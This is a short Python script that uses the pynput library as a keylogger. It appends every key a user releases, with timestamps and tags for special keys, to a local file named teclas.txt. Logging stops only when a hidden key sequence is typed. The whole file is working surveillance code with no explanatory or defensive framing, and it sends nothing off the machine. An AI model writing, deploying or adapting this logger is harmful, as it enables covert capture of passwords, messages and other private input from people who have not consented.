from pynput.keyboard import *
import time
from collections import deque


keyboard = Controller()
password=['q','x',"'",'1','Key.enter']
keys=deque(maxlen=5)

def monitor(key):
    try:
        tuple = time.localtime()
        log(str(key.char))
        keys.append(str(key.char))
    except AttributeError:
        if key==Key.space:
            log('\n')
        elif key==Key.tab:
            log(' <TAB> ')
        elif key==Key.enter:
            log('\n')
        elif key == Key.shift:
            log(' <SHIFT> ')
        elif key==Key.alt:
            log(' <ALT> ')
        elif key==Key.backspace:
            log('')
        elif key==Key.caps_lock:
            log(' <CAPS_LOCK> ')
        elif key==Key.ctrl:
            log(' <CTRL> ')
        else:
            log(str(f" <{key}> "))

        keys.append(str(key))
    if "".join(password)=="".join(keys):
        return False

def log(text):
    f = open(r'teclas.txt', 'a')
    if text=="'":
        f.write(text.replace("'", ""))
    else:
        f.write(text)

log(time.strftime("%d/%m/%Y-%H:%M:  "))

with Listener(on_release=monitor) as listener:
    listener.join()
